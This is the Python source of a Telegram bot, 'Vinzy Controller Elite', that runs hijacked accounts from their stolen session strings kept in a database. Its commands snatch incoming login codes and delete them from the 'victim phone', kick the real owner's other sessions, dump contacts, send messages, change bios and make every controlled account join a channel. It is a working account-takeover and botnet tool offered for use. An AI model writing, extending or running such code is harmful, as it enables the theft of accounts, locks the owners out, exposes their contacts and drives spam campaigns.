import os
import asyncio
import telebot
import psycopg2
from telethon import TelegramClient, functions, types, errors
from telethon.sessions import StringSession
from threading import Thread

# --- CONFIGURATION ---
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")

try:
    raw_group_id = os.environ.get("GROUP_ID", "0")
    GROUP_ID = int(raw_group_id)
except ValueError:
    GROUP_ID = 0

bot = telebot.TeleBot(BOT_TOKEN)

# --- DATABASE LOGIC (NEON.COM) ---

def init_db():
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    cur.execute('''
        CREATE TABLE IF NOT EXISTS controlled_accounts (
            phone TEXT PRIMARY KEY,
            session_string TEXT NOT NULL,
            owner_name TEXT
        )
    ''')
    conn.commit()
    cur.close()
    conn.close()

def save_account(phone, session, name):
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    cur.execute('''
        INSERT INTO controlled_accounts (phone, session_string, owner_name) 
        VALUES (%s, %s, %s) 
        ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string
    ''', (phone, session, name))
    conn.commit()
    cur.close()
    conn.close()

def get_session(phone):
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    cur.execute("SELECT session_string FROM controlled_accounts WHERE phone = %s", (phone,))
    res = cur.fetchone()
    cur.close()
    conn.close()
    return res[0] if res else None

def get_all_phones():
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    cur.execute("SELECT phone, owner_name FROM controlled_accounts")
    res = cur.fetchall()
    cur.close()
    conn.close()
    return res

init_db()

# --- CORE TELETHON RUNNER ---

async def run_task(phone, task_func, *args):
    session_str = get_session(phone)
    if not session_str:
        return "❌ Phone not found in Database."
    
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH, device_model="iPhone 15 Pro Max")
    try:
        await client.connect()
        if not await client.is_user_authorized():
            return f"❌ Session for {phone} has expired."
        return await task_func(client, *args)
    except Exception as e:
        return f"⚠️ Error: {str(e)}"
    finally:
        await client.disconnect()

# --- COMMAND HANDLERS ---

@bot.message_handler(commands=['start', 'help'])
def cmd_help(m):
    if m.chat.id != GROUP_ID: return
    help_text = (
        "👑 <b>Vinzy Controller Elite</b>\n"
        "━━━━━━━━━━━━━━━\n"
        "🔌 <b>Auth:</b>\n"
        "• <code>.auth [string]</code> - Add account to NeonDB\n"
        "• <code>.list</code> - Show all accounts\n\n"
        "🕵️ <b>Stealth:</b>\n"
        "• <code>.getcode [phone]</code> - Get & Delete Login Code\n"
        "• <code>.kickall [phone]</code> - Terminate other sessions\n"
        "• <code>.contacts [phone]</code> - Dump contact list\n\n"
        "🎮 <b>Action:</b>\n"
        "• <code>.join [phone] [link]</code>\n"
        "• <code>.massjoin [link]</code> - All accounts join\n"
        "• <code>.msg [phone] [user] [text]</code>\n"
        "• <code>.bio [phone] [text]</code>\n"
        "━━━━━━━━━━━━━━━"
    )
    bot.send_message(m.chat.id, help_text, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.auth'))
def cmd_auth(m):
    if m.chat.id != GROUP_ID: return
    try:
        session_str = m.text.split(" ", 1)[1].strip()
        async def verify(client):
            me = await client.get_me()
            save_account(me.phone, session_str, me.first_name)
            return f"✅ <b>Authorized:</b> {me.first_name} (<code>{me.phone}</code>)"
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        # Using StringSession directly for initial auth
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        res = loop.run_until_complete(verify(client))
        bot.reply_to(m, res, parse_mode="HTML")
    except:
        bot.reply_to(m, "❌ Usage: <code>.auth [string]</code>")

@bot.message_handler(func=lambda m: m.text == '.list')
def cmd_list(m):
    if m.chat.id != GROUP_ID: return
    accounts = get_all_phones()
    if not accounts: return bot.reply_to(m, "📭 DB is empty.")
    
    msg = "📋 <b>Managed Accounts:</b>\n"
    for phone, name in accounts:
        msg += f"• {name} (<code>{phone}</code>)\n"
    bot.send_message(m.chat.id, msg, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.getcode'))
def cmd_getcode(m):
    if m.chat.id != GROUP_ID: return
    phone = m.text.split(" ")[1]
    
    async def logic(client):
        async for msg in client.iter_messages(777000, limit=1):
            code = msg.text
            await client.delete_messages(777000, [msg.id])
            return f"📩 <b>Code Snatched:</b>\n<code>{code}</code>\n\n<i>Message deleted from victim phone.</i>"
        return "📭 No code found."

    res = asyncio.run(run_task(phone, logic))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.kickall'))
def cmd_kickall(m):
    if m.chat.id != GROUP_ID: return
    phone = m.text.split(" ")[1]
    
    async def logic(client):
        # Terminates all other sessions except the current one
        await client(functions.auth.ResetAuthorizationsRequest())
        return f"⚡ <b>Success!</b> Kicked all other sessions for <code>{phone}</code>."

    res = asyncio.run(run_task(phone, logic))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.contacts'))
def cmd_contacts(m):
    if m.chat.id != GROUP_ID: return
    phone = m.text.split(" ")[1]
    
    async def logic(client):
        res = await client(functions.contacts.GetContactsRequest(hash=0))
        msg = f"👥 <b>Contacts for {phone}:</b>\n"
        for u in res.users[:20]: # Limit to 20 to avoid long message
            msg += f"• {u.first_name} (<code>{getattr(u, 'phone', 'N/A')}</code>)\n"
        return msg

    res = asyncio.run(run_task(phone, logic))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.massjoin'))
def cmd_massjoin(m):
    if m.chat.id != GROUP_ID: return
    link = m.text.split(" ")[1]
    phones = get_all_phones()
    
    bot.send_message(m.chat.id, f"🚀 Starting Mass-Join to <b>{link}</b>...")
    
    async def logic(client, target):
        await client(functions.channels.JoinChannelRequest(channel=target))
        return True

    for phone, name in phones:
        asyncio.run(run_task(phone, logic, link))
    
    bot.send_message(m.chat.id, f"✅ Done! {len(phones)} accounts joined.")

# --- RUN ---
if __name__ == "__main__":
    print("Vinzy Controller is Running...")
    bot.infinity_polling()
